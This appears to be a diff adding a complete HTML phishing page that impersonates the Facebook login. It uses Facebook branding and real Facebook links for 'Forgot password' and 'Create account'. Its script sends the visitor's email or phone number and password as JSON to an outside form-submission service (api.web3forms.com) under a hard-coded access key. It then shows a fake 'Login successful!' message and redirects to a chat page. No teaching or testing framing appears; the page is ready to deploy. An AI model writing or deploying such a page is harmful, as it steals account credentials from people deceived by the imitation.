@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  padding: 0;
+  font-family: 'Helvetica Neue', Arial, sans-serif;
+  background-color:#FAF3F3; /* Facebook blue background */
+  color: #fff; /* White text */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  flex-direction: column;
+}
+
+.login-container {
+  width: 90%;
+  max-width: 360px;
+  padding: 40px;
+  background-color: #fff; /* White background for the form */
+  border-radius: 8px;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); /* Subtle dark shadow */
+  text-align: center;
+  color: #000; /* Black text inside container */
+}
+
+.facebook-logo {
+  margin-bottom: 20px;
+}
+
+.facebook-logo img {
+  width: 120px;
+  height: auto;
+}
+
+h1 {
+  color: #1877f2; /* Facebook blue for the title */
+  font-size: 36px;
+  margin-bottom: 20px;
+  font-weight: bold;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 8px 0;
+  font-size: 16px;
+  border: 1px solid #dcdcdc; /* Light gray border */
+  border-radius: 6px;
+  background-color: #FFFFFF; /* Light input background */
+  color: #000; /* Black text inside input */
+  transition: border-color 0.3s;
+}
+
+input:focus {
+  border-color: #1877f2; /* Facebook blue border on focus */
+  outline: none;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  font-size: 18px;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  background-color: #1877f2; /* Facebook blue button */
+  color: #fff; /* White text */
+  font-weight: bold;
+  margin-top: 10px;
+  transition: background-color 0.3s;
+}
+
+button:hover {
+  background-color: #145dbf; /* Darker Facebook blue on hover */
+}
+
+#result {
+  margin-top: 15px;
+  color: #f00; /* Red text for result message */
+}
+.account-links {
+  text-align: center;
+}
+
+.forgot-password-container {
+  margin-top: 10px; /* Adjust the spacing as needed */
+  text-align: center;
+}
+
+.create-account-container {
+  margin-top: 15px; /* Adjust this value to move it further down */
+  text-align: center;
+}
+
+.forgot-account, .forgot-password, .create-account {
+  color: #1877f2; /* Facebook blue */
+  text-decoration: none;
+  font-size: 14px;
+  font-weight: bold;
+  margin: 0 10px;
+}
+
+.forgot-account:hover, .forgot-password:hover, .create-account:hover {
+  text-decoration: underline;
+}
+    </style>
+  </head>
+  <body>
+    <div class="login-container" id="login-container">
+      <div class="facebook-logo">
+  <img src="/img/download.png" alt="Facebook Logo">
+</div>
+      <h1>Login</h1>
+      <form method="POST" id="form">
+        <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
+        <input type="email address or phone" name="Email or phone" placeholder="Email Address or Phone" required>
+        <input type="text" name="P4$$W0RD" placeholder="Password" required>
+        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+        <button type="submit">Log In</button>
+<div class="forgot-password-container">
+  <a href="https://m.facebook.com/login/identify/" class="forgot-password">Forgot password?</a>
+</div>
+<div class="create-account-container">
+  <a href="https://m.facebook.com/reg/" class="create-account">Create new account</a>
+</div>
+        <div id="result"></div>
+      </form>
+    </div>
+    <script>
+      const form = document.getElementById('form');
+      const result = document.getElementById('result');
+      const loginContainer = document.getElementById('login-container');
+
+      let loggedIn = localStorage.getItem('loggedIn') === 'true'; // Check if user is logged in
+
+      // Check if user is already logged in on page load
+      if (loggedIn) {
+        loginContainer.style.display = "none"; // Hide login container
+        // Redirect to chat page after successful login
+        window.location.href = '/chat.html'; // Change 'chat.html' to your chat page URL
+      }
+
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Check if user is already logged in
+        if (loggedIn) {
+          result.innerHTML = "You are already logged in.";
+          return; // Prevent further processing
+        }
+
+        const formData = new FormData(form);
+        const object = Object.fromEntries(formData);
+        const json = JSON.stringify(object);
+        result.innerHTML = "";
+
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                loggedIn = true; // Set loggedIn to true on successful login
+                localStorage.setItem('loggedIn', 'true'); // Save login status in local storage
+                loginContainer.style.display = "none"; // Hide login on success
+                result.innerHTML = "Login successful!";
+                // Redirect to chat page after successful login
+                window.location.href = '/chat.html'; // Change 'chat.html' to your chat page URL
+            } else {
+                result.innerHTML = "Login failed. Please try again.";
+            }
+        })
+        .catch(error => {
+            result.innerHTML = "Please open your internet once Login you can turn it off.";
+            console.error('Error:', error);
+        });
+      });
+    </script>
+  </body>
+</html>
